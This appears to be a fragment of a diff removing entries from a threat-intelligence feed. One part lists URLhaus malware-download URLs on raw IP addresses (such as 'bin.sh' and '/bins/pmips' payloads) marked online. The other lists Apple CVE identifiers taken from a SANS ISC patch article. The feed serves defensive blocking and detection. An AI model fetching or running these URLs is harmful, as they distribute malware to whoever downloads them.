-      "source_url": "https://urlhaus.abuse.ch/url/3905660/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://66.212.173.225:35221/bin.sh",
-      "type": "url",
-      "threat": "2026-08-19 10:01:14",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905635/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:14",
-      "status": "online"
-    },
-    {
-      "value": "http://27.37.102.157:50864/i",
-      "type": "url",
-      "threat": "2026-08-19 10:01:14",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905636/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:14",
-      "status": "online"
-    },
-    {
-      "value": "http://42.58.252.41:50980/bin.sh",
-      "type": "url",
-      "threat": "2026-08-19 10:01:14",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905637/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:14",
-      "status": "online"
-    },
-    {
-      "value": "http://31.77.227.134/bins/pmips",
-      "type": "url",
-      "threat": "2026-08-19 10:01:14",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905638/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:14",
-      "status": "online"
-    },
-    {
-      "value": "http://60.177.244.198:55825/bin.sh",
-      "type": "url",
-      "threat": "2026-08-19 10:01:14",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905639/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:14",
-      "status": "online"
-    },
-    {
-      "value": "http://182.121.171.163:58015/bin.sh",
-      "type": "url",
-      "threat": "2026-08-19 10:01:14",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905640/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:14",
-      "status": "online"
-    },
-    {
-      "value": "http://210.208.110.172:59900/bin.sh",
-      "type": "url",
-      "threat": "2026-08-19 10:01:14",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905641/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:14",
       "status": "online"
     },
     {
@@ -4551,978 +4551,6 @@
       "context": "f compromise \n\n\n\n      Indicator    Type    Description     a1fdf65020ce4a0f0940c793c6425baf8a0b994ec48b9baaf72788661a9d"
     },
     {
-      "value": "CVE-2026-28958",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "S Tahoe 26.6.2 \r\n\t\t \r\n\t \r\n\t \r\n\t\t \r\n\t\t\t  CVE-2026-28958:  An app may be able to access sensitiv"
-    },
-    {
-      "value": "CVE-2026-28973",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-28973:  A malicious app may be able to break "
-    },
-    {
-      "value": "CVE-2026-28984",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-28984:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-28990",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-28990:  Processing a maliciously crafted imag"
-    },
-    {
-      "value": "CVE-2026-28996",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-28996:  An app may be able to access sensitiv"
-    },
-    {
-      "value": "CVE-2026-39868",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-39868:  An app may be able to cause unexpecte"
-    },
-    {
-      "value": "CVE-2026-39877",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-39877:  An app may be able to disclose kernel"
-    },
-    {
-      "value": "CVE-2026-43661",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43661:  Processing a maliciously crafted imag"
-    },
-    {
-      "value": "CVE-2026-43663",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43663:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-43667",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43667:  An attacker in a privileged network p"
-    },
-    {
-      "value": "CVE-2026-43673",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43673:  Processing a maliciously crafted audi"
-    },
-    {
-      "value": "CVE-2026-43676",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43676:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-43700",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43700:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-43701",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43701:  A malicious website may be able to pr"
-    },
-    {
-      "value": "CVE-2026-43705",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43705:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-43708",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43708:  A malicious website may exfiltrate da"
-    },
-    {
-      "value": "CVE-2026-43711",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43711:  Processing a maliciously crafted vide"
-    },
-    {
-      "value": "CVE-2026-43714",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43714:  A malicious app may be able to access"
-    },
-    {
-      "value": "CVE-2026-43717",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43717:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-43720",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43720:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-43722",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43722:  An app may be able to leak sensitive "
-    },
-    {
-      "value": "CVE-2026-43723",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43723:  An app may be able to gain root privi"
-    },
-    {
-      "value": "CVE-2026-43724",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43724:  An app may be able to cause unexpecte"
-    },
-    {
-      "value": "CVE-2026-43725",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43725:  A malicious website may be able to pr"
-    },
-    {
-      "value": "CVE-2026-43727",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43727:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-43729",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43729:  Processing a maliciously crafted imag"
-    },
-    {
-      "value": "CVE-2026-43731",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43731:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-43735",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43735:  A malicious website may exfiltrate da"
-    },
-    {
-      "value": "CVE-2026-43738",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43738:  Processing a maliciously crafted asse"
-    },
-    {
-      "value": "CVE-2026-43742",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43742:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-43744",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43744:  Processing an audio stream in a malic"
-    },
-    {
-      "value": "CVE-2026-43745",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43745:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-43754",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43754:  An app may be able to leak sensitive "
-    },
-    {
-      "value": "CVE-2026-43757",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43757:  An app may be able to cause unexpecte"
-    },
-    {
-      "value": "CVE-2026-43769",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43769:  An app may be able to cause unexpecte"
-    },
-    {
-      "value": "CVE-2026-43776",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43776:  Processing a maliciously crafted file"
-    },
-    {
-      "value": "CVE-2026-43778",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43778:  An app may be able to cause unexpecte"
-    },
-    {
-      "value": "CVE-2026-43794",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43794:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-43796",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t x \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43796:  An app may be able to read a persiste"
-    },
-    {
-      "value": "CVE-2026-43797",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43797:  An app may be able to access informat"
-    },
-    {
-      "value": "CVE-2026-43800",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43800:  An app may be able to access sensitiv"
-    },
-    {
-      "value": "CVE-2026-43801",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43801:  An app may be able to access sensitiv"
-    },
-    {
-      "value": "CVE-2026-43802",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43802:  An app may be able to cause unexpecte"
-    },
-    {
-      "value": "CVE-2026-43803",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43803:  A remote attacker may be able to caus"
-    },
-    {
-      "value": "CVE-2026-43807",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43807:  A malicious accessory may be able to "
-    },
-    {
-      "value": "CVE-2026-43810",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43810:  A remote user may be able to cause un"
-    },
-    {
-      "value": "CVE-2026-43811",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43811:  An app may be able to modify protecte"
-    },
-    {
-      "value": "CVE-2026-43812",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43812:  An app may be able to cause unexpecte"
-    },
-    {
-      "value": "CVE-2026-43818",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43818:  Processing a maliciously crafted imag"
-    },
-    {
-      "value": "CVE-2026-43821",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-43821:  An app may be able to read files outs"
-    },
-    {
-      "value": "CVE-2026-64692",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64692:  An app may be able to cause a denial-"
-    },
-    {
-      "value": "CVE-2026-64693",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64693:  Processing a maliciously crafted imag"
-    },
-    {
-      "value": "CVE-2026-64695",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64695:  A remote user may be able to cause un"
-    },
-    {
-      "value": "CVE-2026-64700",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64700:  An app may be able to cause unexpecte"
-    },
-    {
-      "value": "CVE-2026-64707",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64707:  An app may be able to delete files fo"
-    },
-    {
-      "value": "CVE-2026-64709",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64709:  An app may be able to disclose kernel"
-    },
-    {
-      "value": "CVE-2026-64715",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64715:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-64719",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
